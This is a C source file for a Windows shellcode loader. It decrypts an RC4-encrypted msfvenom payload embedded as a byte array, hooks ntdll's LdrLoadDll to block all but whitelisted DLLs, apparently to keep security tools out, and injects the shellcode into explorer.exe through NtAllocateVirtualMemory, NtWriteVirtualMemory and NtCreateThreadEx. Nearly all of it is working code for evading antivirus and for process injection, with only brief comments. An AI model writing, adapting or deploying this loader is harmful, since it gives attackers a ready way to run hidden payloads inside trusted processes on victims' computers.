#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <ntdef.h>
#include <winternl.h>

#include "main.h"

/****************************************************************************************************/
// msfvenom -p windows/x64/messagebox -f raw -o meter.bin
// cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
// xxd -i encmeter.bin
/****************************************************************************************************/

unsigned char encmeter_bin[] = {
  0x6e, 0xdc, 0x59, 0x2a, 0x59, 0xad, 0xb4, 0x9b, 0xd6, 0xcd, 0x54, 0x9d,
  0x14, 0x4f, 0x73, 0xcd, 0xf5, 0x4d, 0xf8, 0x12, 0x07, 0xa9, 0x56, 0xd2,
  0x72, 0x0e, 0x72, 0x1a, 0x95, 0xda, 0xff, 0x70, 0xed, 0x3e, 0xe6, 0x86,
  0xad, 0xef, 0x3a, 0x2b, 0x14, 0xb1, 0x59, 0xa7, 0xc6, 0x86, 0x8b, 0x44,
  0xf1, 0x82, 0x34, 0xc7, 0x3a, 0xc9, 0x38, 0xb2, 0x03, 0xce, 0x90, 0x63,
  0x0c, 0x68, 0xe0, 0xde, 0x42, 0xd9, 0x07, 0x07, 0xdc, 0x57, 0x57, 0x72,
  0xab, 0x79, 0xbf, 0xcc, 0x17, 0x17, 0xfc, 0xcc, 0xb7, 0xa6, 0x60, 0x7c,
  0x63, 0xb6, 0x4a, 0xee, 0xea, 0x23, 0x62, 0x8b, 0x89, 0xcc, 0x7f, 0x15,
  0x00, 0x38, 0x7a, 0xaf, 0xc8, 0x90, 0xe9, 0x2d, 0x8a, 0x81, 0x0b, 0x35,
  0x45, 0x66, 0x06, 0xf7, 0x49, 0x9b, 0xc8, 0x01, 0x0e, 0xc1, 0x3b, 0x0e,
  0xb6, 0x50, 0x02, 0x54, 0x9c, 0x56, 0x25, 0x23, 0x79, 0xed, 0x06, 0xe9,
  0x72, 0x3a, 0xbf, 0x9b, 0xcb, 0x32, 0x49, 0xef, 0xaa, 0xb4, 0x91, 0xb0,
  0xca, 0x5c, 0x54, 0x71, 0xcb, 0x22, 0xe6, 0xcf, 0x8f, 0x20, 0x33, 0x84,
  0x09, 0x8d, 0x38, 0x41, 0xcd, 0x23, 0xdd, 0x7d, 0x17, 0xde, 0x4b, 0xce,
  0x24, 0xb6, 0xd0, 0x77, 0x1d, 0x73, 0x97, 0x77, 0x56, 0xde, 0x9b, 0x11,
  0x57, 0x0f, 0x7e, 0xf8, 0xd1, 0x42, 0x6d, 0xce, 0x93, 0x55, 0x60, 0x58,
  0x9b, 0x05, 0xea, 0xa8, 0x21, 0x68, 0x9e, 0x5f, 0x78, 0x3c, 0x1d, 0x1a,
  0x3e, 0xf2, 0x74, 0xc6, 0x9b, 0x84, 0x45, 0x97, 0x7f, 0x8d, 0x97, 0x43,
  0x02, 0xb9, 0xf8, 0x0d, 0x1f, 0x48, 0xa3, 0xc6, 0x31, 0x54, 0x8b, 0x62,
  0x6f, 0xed, 0x7a, 0xc0, 0x61, 0xdd, 0xf5, 0xdd, 0xc9, 0x02, 0xad, 0x7a,
  0xa1, 0xaa, 0x13, 0x2b, 0xa7, 0x9d, 0xd1, 0x54, 0x94, 0xd4, 0x32, 0x35,
  0x52, 0x7e, 0xe0, 0x84, 0xce, 0x3a, 0x3e, 0x65, 0x82, 0xaa, 0xc2, 0x96,
  0xd0, 0x82, 0x58, 0x1b, 0xda, 0x10, 0xea, 0x2a, 0xee, 0x39, 0x17, 0x1b,
  0x5f, 0xad, 0x84, 0x27, 0xca, 0x17, 0x50, 0xcb, 0x98, 0x95, 0xe2, 0xa4,
  0x65, 0xb9, 0x05, 0x47, 0x95, 0x4b, 0x8c
};
unsigned int encmeter_bin_len = 295;

NTSTATUS __stdcall _LdrLoadDll(PWSTR SearchPath OPTIONAL, PULONG DllCharacteristics OPTIONAL, PUNICODE_STRING DllName, PVOID *BaseAddress)
{
    INT i;
    DWORD dwOldProtect;
    BOOL bAllow = FALSE;
    DWORD dwbytesWritten;
    CHAR cDllName[MAX_PATH];

    // change to a char
    sprintf(cDllName, "%S", DllName->Buffer);

    for (i = 0; i < dwAllowDllCount; i++)
    {
        // is it on the whitelist
        if (strcmp(cDllName, cAllowDlls[i]) == 0)
        {
            bAllow = TRUE;

            printf("Allowing DLL: %s\n", cDllName);

            // repatch LdrLoadDll and call it
            VirtualProtect(lpAddr, sizeof(OriginalBytes), PAGE_EXECUTE_READWRITE, &dwOldProtect);
            memcpy(lpAddr, OriginalBytes, sizeof(OriginalBytes));
            VirtualProtect(lpAddr, sizeof(OriginalBytes), dwOldProtect, &dwOldProtect);

            LdrLoadDll_ LdrLoadDll = (LdrLoadDll_)GetProcAddress(LoadLibrary("ntdll.dll"), "LdrLoadDll");

            LdrLoadDll(SearchPath, DllCharacteristics, DllName, BaseAddress);

            // then hook it again
            HookLoadDll(lpAddr);
        }

    }

    if (!bAllow)
    {
        printf("Blocked DLL: %s\n", cDllName);
    }

    return TRUE;
}

VOID HookLoadDll(LPVOID lpAddr)
{
    DWORD oldProtect, oldOldProtect;
    void *hLdrLoadDll = &_LdrLoadDll;

    // our trampoline
    unsigned char boing[] = { 0x49, 0xbb, 0xde, 0xad, 0xc0, 0xde, 0xde, 0xad, 0xc0, 0xde, 0x41, 0xff, 0xe3 };

    // add in the address of our hook
    *(void **)(boing + 2) = &_LdrLoadDll;

    // write the hook
    VirtualProtect(lpAddr, 13, PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(lpAddr, boing, sizeof(boing));
    VirtualProtect(lpAddr, 13, oldProtect, &oldProtect);

    return;
}

BOOL DecryptShellcode()
{
    BOOL bSuccess = TRUE;

    HCRYPTKEY hCryptoKey;
    HCRYPTHASH hCryptHash;
    HCRYPTPROV hCryptoProv;

    BYTE* pbKey = "HideMyShellzPlz?";
    DWORD dwLen = strlen(pbKey);

    // get the crypto context
    bSuccess = fnCryptAcquireContextW(&hCryptoProv, NULL, L"Microsoft Enhanced RSA and AES Cryptographic Provider", PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    if (!bSuccess)
    {
        printf("CryptAcquireContextW\n");
        goto CLEANUP;
    }

    // init an create the hashing handle
    bSuccess = fnCryptCreateHash(hCryptoProv, CALG_SHA_256, 0, 0, &hCryptHash);
    if (!bSuccess)
    {
        printf("CryptCreateHash\n");
        goto CLEANUP;
    }

    // add the key to the hash object
    bSuccess = fnCryptHashData(hCryptHash, pbKey, dwLen, 0);
    if (!bSuccess)
    {
        printf("CryptHashData\n");
        goto CLEANUP;
    }

    // gen the session keys from the hash
    bSuccess = fnCryptDeriveKey(hCryptoProv, CALG_RC4, hCryptHash, 0,&hCryptoKey);
    if (!bSuccess)
    {
        printf("CryptDeriveKey\n");
        goto CLEANUP;
    }

    // decrypt the buffer
    bSuccess = fnCryptDecrypt(hCryptoKey, NULL, FALSE, 0, (BYTE*)encmeter_bin, &encmeter_bin_len);
    if (!bSuccess)
    {
        printf("CryptDecrypt: %d\n", GetLastError());
        goto CLEANUP;
    }

    goto CLEANUP;

    CLEANUP:
        fnCryptReleaseContext(hCryptoProv, 0);
        fnCryptDestroyKey(hCryptoKey);
        fnCryptDestroyHash(hCryptHash);

        return bSuccess;
}

DWORD FindExplorer()
{
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // take snapshot
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnapshot)
    {
        // enum the processes found
        if(Process32First(hSnapshot, &pe32))
        {
            do
            {
                // check if its explorer, if it is then give the pid
                if (strcmp(pe32.szExeFile, "explorer.exe") == 0)
                {
                    return pe32.th32ProcessID;
                }
            } while(Process32Next(hSnapshot, &pe32));
            CloseHandle(hSnapshot);
        }
    }

    return -1;
}

int main(int argc,  char const *argv[])
{
    DWORD dwPid;
    INITIAL_TEB InitTeb;
    LPVOID lpBuffer = NULL;
    CLIENT_ID uPid = { 0 };
    HANDLE hThread, hProcess;
    OBJECT_ATTRIBUTES ObjectAttributes;

    // crypto stuff
    fnCryptAcquireContextW = (CryptAcquireContextW_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptAcquireContextW");
    fnCryptCreateHash = (CryptCreateHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptCreateHash");
    fnCryptHashData = (CryptHashData_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptHashData");
    fnCryptDeriveKey = (CryptDeriveKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDeriveKey");
    fnCryptDecrypt = (CryptDecrypt_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDecrypt");
    fnCryptReleaseContext = (CryptReleaseContext_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptReleaseContext");
    fnCryptDestroyKey = (CryptDestroyKey_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyKey");
    fnCryptDestroyHash = (CryptDestroyHash_)GetProcAddress(LoadLibrary("advapi32.dll"), "CryptDestroyHash");

    // decrypt the shellcode
    if (!DecryptShellcode())
    {
        printf("[!] Failed to decrypt shellcode\n");
        return -1;
    }

    // get addresss of where the hook should be
    lpAddr = (LPVOID)GetProcAddress(GetModuleHandle("ntdll.dll"), "LdrLoadDll");

    // save the original bytes
    memcpy(OriginalBytes, lpAddr, 13);

    // set the hook
    HookLoadDll(lpAddr);

    // find the pid of explorer.exe
    dwPid = FindExplorer();
    if (dwPid == -1)
    {
        printf("[!] Failed to find process\n");
        return -1;
    }

    // set the pid to get a handle to
    uPid.UniqueProcess = (HANDLE)dwPid;
    uPid.UniqueThread = NULL;

    // get a handle on the process
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
    NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);

    // alloc memory
    NtAllocateVirtualMemory(hProcess, &lpBuffer, 0, &encmeter_bin_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // write the shellcode to the process
    NtWriteVirtualMemory(hProcess, lpBuffer, encmeter_bin, encmeter_bin_len, NULL);

    // start the shellcode
    NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (hThread == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to inject shellcode\n");
        return -1;
    }

    printf("[+] Successfully injected shellcode\n");

    return 0;
}
